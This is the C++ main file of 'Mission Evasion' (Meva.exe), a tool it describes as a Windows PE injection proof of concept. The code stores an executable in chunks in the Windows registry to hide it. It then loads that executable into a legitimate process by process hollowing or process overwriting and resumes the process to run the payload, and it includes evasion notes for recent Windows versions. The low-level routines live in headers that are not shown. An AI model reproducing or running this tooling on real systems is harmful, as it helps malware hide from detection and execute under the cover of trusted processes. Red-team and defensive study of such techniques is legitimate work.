#include <iostream>
#include <fstream>
#include "PE.h"
#include "GetInfo.h"
#include "PE.h"
#include "RegHide.h"
#include "globals.h"
#pragma once
#define CONFIG_FILE_PATH "./config.ini"

using namespace std;

// Helper functions for common user interactions
bool promptYesNo(const char* message) {
    std::cout << message << " (y/n): ";
    char choice;
    std::cin >> choice;
    return (choice == 'y' || choice == 'Y');
}

std::string promptForPath(const char* message) {
    std::cout << message;
    std::string path;
    std::cin >> path;
    std::cout << "\n";
    return path;
}

bool handlePELoadError(const char* fileType, std::string& path) {
    printf("\nFailed to load %s PE file. Would you like to specify a different path? (y/n): ", fileType);
    if (promptYesNo("")) {
        path = promptForPath("Enter new path: ");
        return true;
    }
    printf("Exiting...\n");
    return false;
}

void printError(const char* message) {
    std::cout << "Error: " << message << "\n";
}

// Declare Funcs
//bool configFileExists(const std::string& path);
//bool readConfig();
//bool validateConfig();
//void offerConfigMode();
//void printUsage();
//void handleWriteMode();
//void interactiveMenu();
//bool parseCommandLine(int argc, char* argv[]);
//int PInject(NewPEInfo& srcPEInfo, LPCSTR strDestPath);
//void Execute();

void printUsage() {
    std::cout << "\n========== Mission Evasion ==========\n"
        << "A Windows PE injection PoC\n\n"
        << "Usage: Meva.exe [options]\n\n"
        << "Options:\n"
        << "    -i, --interactive           Run in interactive mode\n"
        << "    -c, --config     [path]     Use configuration file\n"
        << "    -w, --write      [path]     Write PE file to registry\n"
        << "    -s, --source     <path>     Source PE file path\n"
        << "    -d, --dest       <path>     Destination PE file path\n"
        << "    -r, --reg        <key>      Registry key for source PE\n"
        << "    -p, --prefix     <prefix>   Registry value prefix\n"
        << "    -t, --technique  <type>     Injection technique (Hollow|Overwrite)\n"
        << "    -h, --help                  Show this help message\n\n"
        << "Examples:\n"
        << "    1. Write PE to registry using config file:\n"
        << "       Meva.exe -c config.ini -w\n\n"
        << "    2. Write PE to registry with specific file:\n"
        << "       Meva.exe -w c:\\LightningGod\\hello.exe\n\n"
        << "    3. Execute PE from file using process hollowing:\n"
        << "       Meva.exe -s c:\\LightningGod\\hello.exe -d c:\\LightningGod\\dest.exe -t Hollow\n\n"
        << "    4. Execute PE from registry using process overwriting:\n"
        << "       Meva.exe -r \\HKEY_CURRENT_USER\\LightningGod -p Part -d c:\\LightningGod\\dest.exe -t Overwrite\n\n"
        << "    5. Run in interactive mode:\n"
        << "       Meva.exe -i\n";
}

void printArchitectureInfo() 
{
    std::cout << "\n=================== NOTE =====================\n"
        << "For Versions >= Win11 24H2, please use Process Overwriting, Hollowing does not work\n\n"

        << "Loader is running in: " << (is64Bit ? "64-bit" : "32-bit") << " mode\n"
        << "For successful injection, ensure:\n"
        << "  - 32-bit loader for 32-bit to 32-bit injection\n"
        << "  - 64-bit loader for 64-bit to 64-bit injection\n"
        << "  - GUI into GUI and CLI into CLI only\n"
        << "==============================================\n\n";
}

// Helper function for registry input menu
void getRegistryInput() {
    // Get registry settings in order
    if (Config.strRegGlobalHkey.empty()) 
    {
        std::cout << "\nSelect global HKEY:\n"
            << "1. HKEY_CLASSES_ROOT\n"
            << "2. HKEY_CURRENT_USER\n"
            << "3. HKEY_LOCAL_MACHINE\n"
            << "4. HKEY_USERS\n"
            << "5. HKEY_CURRENT_CONFIG\n"
            << "\nEnter your choice (1-5): ";
        int hkeyChoice;
        std::cin >> hkeyChoice;
        std::cout << "\n";

        switch (hkeyChoice) {
        case 1:
            Config.strRegGlobalHkey = "HKEY_CLASSES_ROOT";
            break;
        case 2:
            Config.strRegGlobalHkey = "HKEY_CURRENT_USER";
            break;
        case 3:
            Config.strRegGlobalHkey = "HKEY_LOCAL_MACHINE";
            break;
        case 4:
            Config.strRegGlobalHkey = "HKEY_USERS";
            break;
        case 5:
            Config.strRegGlobalHkey = "HKEY_CURRENT_CONFIG";
            break;
        default:
            std::cout << "Invalid choice. Defaulting to HKEY_CURRENT_USER.\n\n";
            Config.strRegGlobalHkey = "HKEY_CURRENT_USER";
            break;
        }
    }

    if (Config.RegKeyName.empty()) 
    {
        std::cout << "Enter registry key path (e.g., System\\CurrentControlSet) - This is the path after the HKEY: ";
        std::cin >> Config.RegKeyName;
        std::cout << "\n";
    }

    if (Config.RegValuePrefix.empty()) 
    {
        std::cout << "Enter registry value prefix (e.g., Part) - This is used to split the PE <Prefix><splitCount>: ";
        std::cin >> Config.RegValuePrefix;
        std::cout << "\n";
    }

    // Show the full registry path that will be used
    std::cout << "\nFull registry path that will be used:\n"
        << Config.strRegGlobalHkey << "\\" << Config.RegKeyName << "\\" << Config.RegValuePrefix << "#\n\n";
}

void handleWriteMode() {
    if (Config.SourcePEPath.empty()) {
        std::cout << "Error: Source file path is required for write mode\n";
        return;
    }

    // Get registry input first
    getRegistryInput();

    // Full registry path string
    std::string fullRegPath = Config.strRegGlobalHkey + "\\" + Config.RegKeyName;

    printf("\nHiding %s in WinReg\n", Config.SourcePEPath.c_str());
    printf("\nGlobal HKEY: %s\nRegistry Key: %s\nRegistry Value Prefix: %s\n",
        Config.strRegGlobalHkey.c_str(), Config.RegKeyName.c_str(), Config.RegValuePrefix.c_str());

    // Print full registry path
    std::cout << "\nFull Registry Path: " << fullRegPath << "\\" << Config.RegValuePrefix << "#" << std::endl << std::endl;

    RegHide(Config.SourcePEPath.c_str(), Config.RegGlobalHkey, Config.RegKeyName.c_str(), Config.RegValuePrefix.c_str());

    std::cout << "Source PE written to WinReg.\nDon't forget to delete the key when you are done!\n";
}

bool configFileExists(const std::string& path) {
    std::ifstream f(path.c_str());
    return f.good();
}

bool readConfig()
{
    std::string configPath = Config.configFilePath.empty() ? CONFIG_FILE_PATH : Config.configFilePath;
    std::ifstream in(configPath);
    if (!in.is_open()) {
        printf("Cannot open configuration file from %s\n", configPath.c_str());
        return false;
    }

    std::string config_param;
    std::string config_value;
    bool hasInputMethod = false;
    bool hasTechnique = false;

    // First pass: Get input method and technique
    while (!in.eof())
    {
        in >> config_param >> config_value;
        // Skip if not input_method or technique
        if (config_param != "SOURCE_INPUT_METHOD" && config_param != "INJECTION_TECHNIQUE")
        {
            continue;
        }
        if (config_param == "SOURCE_INPUT_METHOD") {
            hasInputMethod = true;
            if (config_value == "FILE")
                Config.peSource = PESource::FILE;
            else if (config_value == "REG")
                Config.peSource = PESource::REGISTRY;
        }
        else if (config_param == "INJECTION_TECHNIQUE") {
            hasTechnique = true;
            if (config_value == "Hollow")
                Config.technique = InjectionTechnique::HOLLOW;
            else if (config_value == "Overwrite")
                Config.technique = InjectionTechnique::OVERWRITE;
        }

        // Exit loop if we have both values
        if (hasInputMethod && hasTechnique) {
            break;
        }
    }

    // If input method not defined in config, prompt user
    if (!hasInputMethod) {
        std::cout << "\nInput method not specified in config file.\n";
        std::cout << "Please select input method:\n";
        std::cout << "1. File\n";
        std::cout << "2. Registry\n";
        std::cout << "\nChoice: \n";
        
        int choice;
        std::cin >> choice;
        
        if (choice == 1) {
            Config.peSource = PESource::FILE;
        } else if (choice == 2) {
            Config.peSource = PESource::REGISTRY;
        } else {
            std::cout << "Invalid choice. Defaulting to File input method.\n";
            Config.peSource = PESource::FILE;
        }
    }

    // If technique not defined in config, set default to Overwrite
    if (!hasTechnique) {
        Config.technique = InjectionTechnique::OVERWRITE;
    }

    // Reset file stream for second pass
    in.clear();
    in.seekg(0);

    // Second pass: Get paths based on input method and architecture
    bool hasSourcePath = false;
    bool hasDestPath = false;
    bool hasRegInfo = false;
    bool hasRegKey = false;
    bool hasRegPrefix = false;
    bool hasRegHkey = false;

    while (!in.eof())
    {
        in >> config_param >> config_value;
        if (config_param == "SOURCE_INPUT_METHOD" || config_param == "INJECTION_TECHNIQUE") 
        {
            continue;
        }
        // Skip parameters that don't match our architecture
        if ((is64Bit && config_param.find("32") != std::string::npos) || 
            (!is64Bit && config_param.find("64") != std::string::npos))
        {
            continue;
        }
        // Only read source path if in FILE mode
        if (Config.peSource == PESource::FILE) {
            if (config_param == "SOURCE_PE_PATH32" && !is64Bit) {
                Config.SourcePEPath = config_value;
                hasSourcePath = true;
            }
            else if (config_param == "SOURCE_PE_PATH64" && is64Bit) {
                Config.SourcePEPath = config_value;
                hasSourcePath = true;
            }
        }
        // Only read registry values if in REGISTRY mode
        else if (Config.peSource == PESource::REGISTRY) {
            if (config_param == "GLOBAL_HKEY") {
                Config.strRegGlobalHkey = config_value;
                hasRegHkey = true;
            }
            else if (config_param == "REGISTRY_KEY_NAME") {
                Config.RegKeyName = config_value;
                hasRegKey = true;
            }
            else if (config_param == "REGISTRY_VALUE_PREFIX") {
                Config.RegValuePrefix = config_value;
                hasRegPrefix = true;
            }
        }

        if (config_param == "DEST_PE_PATH32" && !is64Bit) {
            Config.DestPEPath = config_value;
            hasDestPath = true;
        }
        else if (config_param == "DEST_PE_PATH64" && is64Bit) {
            Config.DestPEPath = config_value;
            hasDestPath = true;
        }

        // Exit if we have all required values
        if (Config.peSource == PESource::FILE) {
            if (hasSourcePath && hasDestPath) break;
        } else { // REGISTRY mode
            if (hasRegHkey && hasRegKey && hasRegPrefix && hasDestPath) break;
        }
    }

    in.close();

    // Verify that we got the correct paths for our architecture
    if (Config.DestPEPath.empty()) {
        std::cout << "Error: Missing required destination path for " << (is64Bit ? "64-bit" : "32-bit") << " architecture.\n";
        return false;
    }

    // Validate source information based on input method
    if (Config.peSource == PESource::FILE && Config.SourcePEPath.empty()) {
        std::cout << "Error: Source path is missing in config file\n";
        return false;
    }
    else if (Config.peSource == PESource::REGISTRY) {
        if (!hasRegHkey) {
            std::cout << "Error: GLOBAL_HKEY is missing in config file\n";
            return false;
        }
        if (!hasRegKey) {
            std::cout << "Error: REGISTRY_KEY_NAME is missing in config file\n";
            return false;
        }
        if (!hasRegPrefix) {
            std::cout << "Error: REGISTRY_VALUE_PREFIX is missing in config file\n";
            return false;
        }
    }

    // Set HKEY based on string value
    if (Config.strRegGlobalHkey == "HKEY_CLASSES_ROOT")
        Config.RegGlobalHkey = HKEY_CLASSES_ROOT;
    else if (Config.strRegGlobalHkey == "HKEY_CURRENT_USER")
        Config.RegGlobalHkey = HKEY_CURRENT_USER;
    else if (Config.strRegGlobalHkey == "HKEY_LOCAL_MACHINE")
        Config.RegGlobalHkey = HKEY_LOCAL_MACHINE;
    else if (Config.strRegGlobalHkey == "HKEY_USERS")
        Config.RegGlobalHkey = HKEY_USERS;
    else if (Config.strRegGlobalHkey == "HKEY_CURRENT_CONFIG")
        Config.RegGlobalHkey = HKEY_CURRENT_CONFIG;
    else if (!Config.strRegGlobalHkey.empty()) {
        std::cout << "Invalid GLOBAL_HKEY value in config file.\n";
        return false;
    }

    return true;
}

bool validateConfig() {
    bool isValid = true;
    
    // Check if we have a valid destination path
    if (Config.DestPEPath.empty()) {
        std::cout << "Error: Destination path is missing in config file\n";
        isValid = false;
    }
    
    // Check if we have valid source information
    if (Config.peSource == PESource::FILE && Config.SourcePEPath.empty()) {
        std::cout << "Error: Source path is missing in config file\n";
        isValid = false;
    }
    else if (Config.peSource == PESource::REGISTRY && 
            (Config.RegKeyName.empty() || Config.RegValuePrefix.empty())) {
        std::cout << "Error: Registry information is incomplete in config file\n";
        isValid = false;
    }
    
    return isValid;
}

void offerConfigMode() {
    std::cout << "\nA configuration file was found at: " << CONFIG_FILE_PATH << "\n";
    if (promptYesNo("Would you like to use it")) {
        Config.useConfig = true;
        Config.useInteractive = false;
    }
    else {
        std::cout << "\nProceeding with interactive mode...\n";
        Config.useConfig = false;
        Config.useInteractive = true;
    }
}

bool parseCommandLine(int argc, char* argv[]) 
{
    if (argc < 2) 
    {
        return false;
    }

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "-c" || arg == "--config") {
            Config.useConfig = true;
            // Check if next argument is a path
            if (i + 1 < argc && argv[i + 1][0] != '-') {
                Config.configFilePath = argv[++i];
            }
        }
        else if (arg == "-i" || arg == "--interactive") {
            Config.useInteractive = true;
        }
        else if (arg == "-w" || arg == "--write") {
            Config.writeMode = true;
            // Check if next argument is a path
            if (i + 1 < argc && argv[i + 1][0] != '-') {
                Config.SourcePEPath = argv[++i];
            }
        }
        else if (arg == "-s" || arg == "--source") {
            if (i + 1 < argc) {
                Config.SourcePEPath = argv[++i];
                Config.peSource = PESource::FILE;
            }
        }
        else if (arg == "-d" || arg == "--dest") {
            if (i + 1 < argc) {
                Config.DestPEPath = argv[++i];
            }
        }
        else if (arg == "-r" || arg == "--reg") {
            if (i + 1 < argc) {
                Config.RegKeyName = argv[++i];
                Config.peSource = PESource::REGISTRY;
            }
        }
        else if (arg == "-p" || arg == "--prefix") {
            if (i + 1 < argc) {
                Config.RegValuePrefix = argv[++i];
            }
        }
        else if (arg == "-t" || arg == "--technique") {
            if (i + 1 < argc) {
                std::string tech = argv[++i];
                if (tech == "Hollow")
                    Config.technique = InjectionTechnique::HOLLOW;
                else if (tech == "Overwrite")
                    Config.technique = InjectionTechnique::OVERWRITE;
                else {
                    std::cout << "Error: Invalid technique specified\n";
                    return false;
                }
            }
        }
        else if (arg == "-h" || arg == "--help") {
            printUsage();
            return false;
        }
        else {
            std::cout << "Error: Unknown argument " << arg << "\n";
            return false;
        }
    }

    // Handle write mode
    if (Config.writeMode) {
        if (Config.SourcePEPath.empty()) {
            // If no source path provided, check config
            if (configFileExists(CONFIG_FILE_PATH)) {
                std::cout << "\nA configuration file was found. Would you like to use it? (y/n): ";
                char choice;
                std::cin >> choice;

                if (choice == 'y' || choice == 'Y') {
                    if (!readConfig()) {
                        std::cout << "Error reading config file. Please enter source path: ";
                        std::cin >> Config.SourcePEPath;
                    }
                }
                else {
                    std::cout << "Please enter source path: ";
                    std::cin >> Config.SourcePEPath;
                }
            }
            else {
                std::cout << "Please enter source path: ";
                std::cin >> Config.SourcePEPath;
            }
        }
        return true;
    }

    // Validate required arguments for execution mode
    if (Config.DestPEPath.empty()) {
        std::cout << "Error: Destination path is required\n";
        return false;
    }

    if (Config.peSource == PESource::FILE && Config.SourcePEPath.empty()) {
        std::cout << "Error: Source path is required for file mode\n";
        return false;
    }
    else if (Config.peSource == PESource::REGISTRY &&
        (Config.RegKeyName.empty() || Config.RegValuePrefix.empty())) {
        std::cout << "Error: Registry key and value prefix are required for registry mode\n";
        return false;
    }

    return true;
}

void interactiveMenu() {
    std::cout << "\n========== Mission Evasion Interactive Mode ==========\n\n";

    // First ask if user wants to write or execute
    std::cout << "Select operation:\n"
        << "1. Write PE to Registry\n"
        << "2. Execute PE\n"
        << "\nEnter your choice (1-2): ";
    int opChoice;
    std::cin >> opChoice;
    std::cout << "\n";

    Config.writeMode = (opChoice == 1);

    if (Config.writeMode) 
    {
        // Check if config exists and offer to use it
        if (configFileExists(CONFIG_FILE_PATH)) {
            std::cout << "A configuration file was found. Would you like to use it for registry settings? (y/n): ";
            char choice;
            std::cin >> choice;
            std::cout << "\n";

            if (choice == 'y' || choice == 'Y') {
                if (!readConfig()) {
                    std::cout << "Error reading config file. Please enter settings manually.\n\n";
                }
            }
        }

        // If no config or user declined, get settings manually
        if (Config.SourcePEPath.empty()) {
            std::cout << "Enter source PE path: ";
            std::cin >> Config.SourcePEPath;
            std::cout << "\n";
        }

        handleWriteMode();
        return;
    }

    // Regular execution mode
    std::cout << "Select PE source:\n"
        << "1. File on disk\n"
        << "2. Registry\n"
        << "\nEnter your choice (1-2): ";
    int sourceChoice;
    std::cin >> sourceChoice;
    std::cout << "\n";

    Config.peSource = (sourceChoice == 1) ? PESource::FILE : PESource::REGISTRY;

    // Get source path
    if (Config.peSource == PESource::FILE) {
        std::cout << "Enter source PE path: ";
        std::cin >> Config.SourcePEPath;
        std::cout << "\n";
    }
    else {
        getRegistryInput();
    }

    // Get destination path
    std::cout << "Enter destination PE path: ";
    std::cin >> Config.DestPEPath;
    std::cout << "\n";

    // Get technique
    std::cout << "Select injection technique:\n"
        << "1. Process Overwriting\n"
        << "2. Process Hollowing\n"
        << "\nEnter your choice (1-2): ";
    int techChoice;
    std::cin >> techChoice;
    std::cout << "\n";

    switch (techChoice) {
    case 1:
        Config.technique = InjectionTechnique::OVERWRITE;
        break;
    case 2:
        Config.technique = InjectionTechnique::HOLLOW;
        break;
    default:
        std::cout << "Invalid choice. Defaulting to Process Overwriting.\n\n";
        Config.technique = InjectionTechnique::OVERWRITE;
        break;
    }
}

int PInject(NewPEInfo& srcPEInfo, LPCSTR strDestPath, InjectionTechnique technique)
{
    // GET DEST PE INFO
    NewPEInfo destPEInfo = StorePEInMemory(PEInputMode::FromFile, strDestPath, NULL, NULL, NULL, NULL);
    if (!destPEInfo.pFileData || !destPEInfo.pDosHeader)
    {
        if (handlePELoadError("destination", Config.DestPEPath)) {
            destPEInfo = StorePEInMemory(PEInputMode::FromFile, Config.DestPEPath.c_str());
            if (!destPEInfo.pFileData || !destPEInfo.pDosHeader) {
                printError("Failed to load destination PE file again");
                return false;
            }
        } else {
            return false;
        }
    }

    //Check Bitness compatability
    auto srcArch = getArch(srcPEInfo);
    auto destArch = getArch(destPEInfo);
    if (srcArch != destArch)
    {
        printf("Bitness Mismatched!\n\tSource PE: %s\n\tDestination PE: %s\n", srcArch.c_str(), destArch.c_str());
        return false;
    }

    //Check current injection scenario, 64-64 or 32-32
    if (srcArch == "x64 (64-bit)" && destArch == "x64 (64-bit)")
    {
        printf("Current injection scenario: 64 -> 64\n");
    }
    else if (srcArch == "x86 (32-bit)" && destArch == "x86 (32-bit)")
    {
        printf("Current injection scenario: 32 -> 32\n");
        is64Bit = false;
    }
    else
    {
        printf("Current injection scenario is not supported, exiting \n");
        return false;
    }

    //Check source PE is smaller than destination PE
    auto SrcImageSize = GetImageSize(srcPEInfo);
    auto DestImageSize = GetImageSize(destPEInfo);
    if (SrcImageSize > DestImageSize)
    {
        printf("Source Image is larger than Destination Image\n\tSource Image: %zu\n\tDestination Image: %zu\n", SrcImageSize, DestImageSize);
        return false;
    }
    // GET DUMMY PROCESS INFO
    PROCESS_INFORMATION destProcessInfo = GetDestProcessInfo(strDestPath);
    // GET DESTINATION PROCESS' PEB
    PEB destProcessPeb = GetPEBExternal(destProcessInfo.hProcess);

    //GET STARTING ADDRESS OF DESTINATION PROCESS
    PVOID destImageBase = destProcessPeb.ImageBaseAddress;

    // INJECT SOURCE PROCESS INTO DESTINATION PROCESS
    PROCESS_INFORMATION processInfo;
    if (technique == InjectionTechnique::OVERWRITE)
    {
        printf("Using Process Overwriting\n");
        processInfo = ProcessOverwriting(srcPEInfo, destProcessInfo, destImageBase, DestImageSize);
    }
    else if (technique == InjectionTechnique::HOLLOW)
    {
        printf("Using Process Hollowing\n");
        processInfo = ProcessHollowing(srcPEInfo, destProcessInfo, destImageBase, DestImageSize);
    }
    else
    {
        printf("Invalid injection technique specified.\n");
        return false;
    }
    
    // RESUME THE NOW ZOMBIE PROCESS. BRAAAIIIIIIIIIIINZZZZ
    ResumeDestProcess(srcPEInfo, processInfo, destImageBase);

    return true;
}

void Execute() {
    NewPEInfo srcPEInfo;
    
    // Get source PE
    if (Config.peSource == PESource::FILE) 
    {
        srcPEInfo = StorePEInMemory(PEInputMode::FromFile, Config.SourcePEPath.c_str());
        // Check if PE was loaded successfully
        if (!srcPEInfo.pFileData || !srcPEInfo.pDosHeader) {
            if (handlePELoadError("source", Config.SourcePEPath)) {
                srcPEInfo = StorePEInMemory(PEInputMode::FromFile, Config.SourcePEPath.c_str());
                if (!srcPEInfo.pFileData || !srcPEInfo.pDosHeader) {
                    printError("Failed to load PE file again");
                    return;
                }
            } else {
                return;
            }
        }
    } 
    else 
    {
        srcPEInfo = StorePEInMemory(PEInputMode::FromRegistry, nullptr, 
            Config.RegKeyName.c_str(), Config.RegValuePrefix.c_str());
        if (!srcPEInfo.pFileData || !srcPEInfo.pDosHeader) {
            printError("Failed to load PE from registry");
            return;
        }
    }
    
    // Execute injection using PInject for both techniques
    printf("\nExecuting %s on %s\n", 
        (Config.technique == InjectionTechnique::OVERWRITE ? "Overwriting" : "Hollowing"),
        Config.DestPEPath.c_str());
    
    if (!(PInject(srcPEInfo, Config.DestPEPath.c_str(), Config.technique)))
    {
        printError("Injection Failed");
        return;
    }
    printf("\nSuccessfully executed the payload, check your taskbar!\n");
}

int main(int argc, char* argv[])
{

    // If no arguments provided, check for config file first
    if (argc == 1) 
    {
        printUsage();
        // Print architecture information at startup
        printArchitectureInfo();
        std::cout << "\nNo arguments provided. Checking for configuration file...\n";
        
        if (configFileExists(CONFIG_FILE_PATH)) {
            offerConfigMode();
        } else {
            std::cout << "\nNo configuration file found. Dropping into interactive mode...\n";
            Config.useInteractive = true;
        }
    }
    // Parse command line arguments if any were provided
    else if (!parseCommandLine(argc, argv)) 
    {
        return -1;
    }
    
    // Handle different modes
    if (Config.useInteractive) {
        interactiveMenu();
    }
    else if (Config.useConfig) {
        if (!readConfig()) {
            std::cout << "Error reading config file, falling back to interactive mode\n";
            interactiveMenu();
        }
        else if (!validateConfig()) {
            std::cout << "Config file is incomplete, falling back to interactive mode\n";
            interactiveMenu();
        }
    }
    
    // Execute the appropriate operation
    if (Config.writeMode) 
    {
        handleWriteMode();
    } 
    else 
    {
        Execute();
    }
    
    return 0;
}
